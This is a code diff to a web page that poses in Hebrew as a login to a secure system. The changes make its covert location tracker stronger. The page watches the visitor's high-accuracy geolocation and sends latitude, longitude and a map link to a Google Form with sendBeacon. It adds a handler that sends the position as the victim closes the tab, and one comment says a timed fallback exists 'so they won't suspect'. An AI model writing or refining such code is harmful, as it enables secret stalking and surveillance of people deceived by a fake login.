@@ -14,7 +14,7 @@
 <body>
 
     <div class="loader"></div>
-    <p id="status">מתחבר למערכת...</p>
+    <p id="status">מתחבר למערכת המאובטחת...</p>
 
     <script>
         window.onload = function() {
@@ -24,54 +24,73 @@
                 return;
             }
 
-            document.getElementById("status").innerText = "מאמת נתונים...";
-
             let hasSent = false;
             let bestPosition = null;
+            let bestAccuracy = Infinity;
 
-            function sendToGoogle(pos, name) {
-                if (hasSent) return;
+            function sendToGoogle(pos, name, type = "Final") {
+                if (hasSent || !pos) return;
                 hasSent = true;
 
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                
-                // יצירת הקישור הישיר והנקי ל-Google Maps
+                const acc = pos.coords.accuracy;
                 const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
                 const formID = "1FAIpQLSfYA2SsnyuwYFOhz_IjWdfLAkudHUJPBWmS3VUoF-8xp5u6Gw";
                 const url = `https://docs.google.com/forms/d/e/${formID}/formResponse` +
                     `?entry.1905099702=${lat}` +
                     `&entry.379601602=${lon}` +
-                    `&entry.1378939865=${encodeURIComponent(mapsLink)}` + // שדה 4 מקבל רק קישור
-                    `&entry.2102560173=${encodeURIComponent(name)}` +
+                    `&entry.1378939865=${encodeURIComponent(mapsLink)}` +
+                    `&entry.2102560173=${encodeURIComponent(name + " (Acc: " + Math.round(acc) + "m)")}` +
                     `&submit=Submit`;
 
-                // שליחה מהירה
-                fetch(url, { mode: 'no-cors' });
+                // שימוש ב-sendBeacon לשליחה אמינה גם ביציאה מהדף
+                navigator.sendBeacon(url);
                 
-                document.getElementById("status").innerText = "נכנסת בהצלחה!";
-                setTimeout(() => { alert("שלום " + name + ", הכניסה אושרה."); }, 500);
+                if (type === "Final") {
+                    document.getElementById("status").innerText = "נכנסת בהצלחה!";
+                    alert("שלום " + name + ", הכניסה אושרה.");
+                }
             }
 
+            // האזנה רציפה לשיפור הדיוק
             const watchID = navigator.geolocation.watchPosition((pos) => {
-                bestPosition = pos;
-                // סף דיוק של 5 מטרים
-                if (pos.coords.accuracy <= 5) {
+                const currentAccuracy = pos.coords.accuracy;
+                
+                // תמיד שומרים את המיקום הכי טוב שהיה לנו
+                if (currentAccuracy < bestAccuracy) {
+                    bestAccuracy = currentAccuracy;
+                    bestPosition = pos;
+                }
+
+                // אם הגענו לדיוק של פחות מ-5 מטר (ממש על הנקודה) - שולחים ועוצרים
+                if (currentAccuracy <= 5) {
                     navigator.geolocation.clearWatch(watchID);
                     sendToGoogle(pos, userName);
                 }
             }, (err) => {
                 console.log(err);
-            }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+            }, { 
+                enableHighAccuracy: true, 
+                timeout: 60000, // מחכה עד דקה לדיוק מקסימלי
+                maximumAge: 0 
+            });
 
-            // אם אחרי 10 שניות לא הגענו ל-5 מטר, שלח את הכי טוב שיש
+            // מנגנון "הצלה": אם המשתמש מנסה לסגור את הלשונית או לצאת מהדפדפן
+            window.onbeforeunload = window.onunload = function() {
+                if (!hasSent && bestPosition) {
+                    sendToGoogle(bestPosition, userName, "Exit");
+                }
+            };
+
+            // אם אחרי 20 שניות עדיין לא הגענו ל-5 מטר, נשלח את הכי טוב שיש (כדי שלא יחשדו)
             setTimeout(() => {
                 if (!hasSent && bestPosition) {
                     navigator.geolocation.clearWatch(watchID);
                     sendToGoogle(bestPosition, userName);
                 }
-            }, 10000);
+            }, 20000);
         };
     </script>
 </body>
